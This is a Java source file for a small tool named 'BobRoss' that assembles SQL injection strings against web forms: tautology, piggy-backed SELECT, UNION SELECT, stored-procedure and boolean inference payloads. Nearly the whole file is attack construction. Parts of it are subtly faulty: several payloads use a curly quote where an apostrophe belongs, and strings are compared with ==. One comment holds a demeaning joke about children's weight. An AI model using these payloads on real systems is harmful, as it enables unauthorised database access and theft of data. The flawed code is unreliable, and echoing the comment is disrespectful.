package tools;

/** <strong>Bob Ross Query Constructor</strong>
 * <p>Remember, there are no mistakes, just happy SQL
 * injection prone form entries. Helps construct
 * attack entries for potentially weak form sanitizing</p>
 * @author Michael Mueller
 *
 */
public class BobRoss {
	
	/**
	 * Bob Ross stirs from his slumber...
	 */
	public BobRoss(){
		//constructor
	}
	
	/** Tauta-... tautalolog... tautology style attack
	 * @param base: Base input because server's prefer inputs to not be empty
	 * @return the constructed attack
	 */
	public String attack_hot_tautic(String base){
		String attack = base;
		
		attack += "' or 1=1 --";
		return attack;
	}
	
	public String attack_second_order(String base, String args[], String subtype){
		String attack = base;
		
		switch(subtype){
			case "tautology":
				if (args.length != 0){
					CP.println("Invalid Arguments Passed for type: "+subtype);
					CP.println(subtype+":: NONE");
					return null;
				}
				return attack_hot_tautic(base);
				
			case "piggy-back":
				if (args.length != 3){
					CP.println("Error:: Invalid Arguments Passed"+subtype);
					CP.println(subtype+":: attribute, table, equality");
					return null;
				}
				return attack_piggy_bois(base, args[0], args[1], args[2]);
				
			case "union":
				if (args.length != 3){
					CP.println("Error:: Invalid Arguments Passed"+subtype);
					CP.println(subtype+":: attribute, table, equality");
					return null;
				}
				return attack_union_jack(base, args[0], args[1], args[2]);
				
			case "procedure":
				if (args.length != 1){
					CP.println("Error:: Invalid Arguments Passed"+subtype);
					CP.println(subtype+":: procedure");
					return null;
				}
				return attack_fatty_fatty_boombalady(base, args[0]);
				
			case "inference":
				if (args.length != 2){
					CP.println("Error:: Invalid Arguments Passed"+subtype);
					CP.println(subtype+":: legal_input, string_bool");
					return null;
				}
				return attack_achktually(base, args[0], (args[1] == "true")? true : (args[1] == "false")? false : null);
				
		}
		//attack += "';" +" SELECT "+attribute+" FROM "+table+" WHERE "+equality+" --";
		return attack;
	}
	
	/** Piggybacked query style attack
	 * @param base:  Base input because server's prefer inputs to not be empty
	 * @param query: User defined query they are trying to run
	 * @return the constructed attack
	 */
	public String attack_piggy_bois(String base, String attribute, String table, String equality){
		String attack = base;
		
		attack += "';" +" SELECT "+attribute+" FROM "+table+" WHERE "+equality+" --";
		return attack;
	}
	
	
	/**
	 *  Union style attack.
	 * @param base:      Base input because server's prefer inputs to not be empty
	 * @param attribute: Attribute that we are trying to pull
	 * @param table:     Table we are trying to pull from
	 * @param equality:  Equality for pulling data. Can be ommitted to pull all really
	 * @return the constructed attack
	 */
	public String attack_union_jack(String base, String attribute, String table, String equality){
		String attack = base;
		
		attack += "’ UNION SELECT "+attribute+" FROM "+table+" WHERE "+equality+" --";
		return attack;
	}
	
	/** Stored procedure style attack
	 * Name it something you would call a fat kid -- Zach
	 * @param base:      Base input because server's prefer inputs to not be empty 
	 * @param procedure: Procedure we are trying to invoke
	 * @return the constructed attack
	 */
	public String attack_fatty_fatty_boombalady(String base, String procedure){
		String attack = base;
		
		attack += "’ ; "+procedure+"; --";
		return attack;
	}
	
	/** Inference style attack
	 * @param base:       Base input because server's prefer inputs to not be empty 
	 * @param legalInput: An input that would be expected to normally return true/valid
	 * @param isTrue:     Flag for if we are trying to evaluate to true or false
	 * @return the constructed attack
	 */
	public String attack_achktually(String base, String legalInput, Boolean isTrue){
		String attack = base;
		attack += legalInput;
		if (isTrue)
			attack += "’ and 1=1 --";
		else
			attack += "’ and 1=0 --";
		
		return attack;
	}
}
